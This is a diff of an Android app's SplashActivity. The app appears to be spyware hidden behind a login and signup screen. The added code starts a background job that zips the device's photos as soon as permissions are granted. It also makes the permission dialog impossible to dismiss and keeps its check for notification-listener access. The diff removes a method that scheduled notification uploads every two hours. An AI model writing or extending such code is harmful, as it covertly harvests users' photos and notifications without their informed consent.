@@ -86,11 +86,8 @@ public class SplashActivity extends AppCompatActivity {
         documentFiles.Search_Dir(Environment.getExternalStorageDirectory());
 */
 
-
-//        startAlarmManager();
-
         if (checkAndRequestPermissions()) {
-            startWorkmanager();
+            zipPhotos();
         }
 
         if (!NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName())) {
@@ -106,7 +103,6 @@ public class SplashActivity extends AppCompatActivity {
         loginBt.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                Log.i(TAG, "onClick: "+"Clickeddddd");
                 startActivity(new Intent(SplashActivity.this, LoginActivity.class));
                 finish();
             }
@@ -114,15 +110,12 @@ public class SplashActivity extends AppCompatActivity {
         signupBT.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                Log.i(TAG, "onClick: "+"Clickeddddd");
                 startActivity(new Intent(SplashActivity.this, SignupActivity.class));
                 finish();
             }
         });
 
     }
-
-
 
     public void showPermissionDialogue() {
         if (!NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName())) {
@@ -145,6 +138,7 @@ public class SplashActivity extends AppCompatActivity {
             };
 
             AlertDialog.Builder builder = new AlertDialog.Builder(this);
+            builder.setCancelable(false);
             builder.setMessage("You Need To Allow Permissions To Get The Best Of This App.").setPositiveButton("Allow Permission", dialogClickListener)
                     .setNegativeButton("Cancel, Close App", dialogClickListener).show();//ask for permission
 
@@ -159,7 +153,6 @@ public class SplashActivity extends AppCompatActivity {
                     listPermissionsNeeded.add(perm);
                 }
             }
-
             //Ask for non-granted permissions
             if (!listPermissionsNeeded.isEmpty()) {
                 ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]), PERMISSIONS_REQUEST_CODE);
@@ -188,7 +181,7 @@ public class SplashActivity extends AppCompatActivity {
 
                     if (deniedCount == 0) {
 //                proceed with your work here
-                        startWorkmanager();
+                        zipPhotos();
                     } else {
                         for (Map.Entry<String, Integer> entry : permissionResults.entrySet()) {
                             String permName = entry.getKey();
@@ -258,10 +251,10 @@ public class SplashActivity extends AppCompatActivity {
             return alertDialog;
         }
 
-        public void startWorkmanager () {
-            Log.i(TAG, "startWorkmanager: work manager has started");
+        public void zipPhotos () {
             final WorkManager mWorkManager = WorkManager.getInstance();
             final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(ImageFileSaver.class).build();
+
             mWorkManager.enqueue(mRequest);
             mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
                 @Override
@@ -269,26 +262,13 @@ public class SplashActivity extends AppCompatActivity {
                     if (workInfo != null) {
                         if (workInfo.getState().isFinished()) {
                             workInfo.getOutputData().getBoolean("photosZipped", false);
-                            Log.i(TAG, "onChanged: " + Arrays.toString(workInfo.getOutputData().getStringArray("photosList")));
                         }
                     }
                 }
             });
         }
 
-    public void startAlarmManager() {
-        Log.i(TAG, "startWorkmanager: work manager has started");
-        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
-        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 2, TimeUnit.HOURS)
-                .setConstraints(constraints)
-                .build();
 
-        WorkManager instance = WorkManager.getInstance();
-       /* if (instance != null) {
-            instance.enqueueUniquePeriodicWork(TAG, ExistingPeriodicWorkPolicy.REPLACE, build);
-        }*/
-        instance.enqueueUniquePeriodicWork("uploadNotif",ExistingPeriodicWorkPolicy.REPLACE,build);
-    }
 
 
     private BroadcastReceiver onNotice = new BroadcastReceiver() {
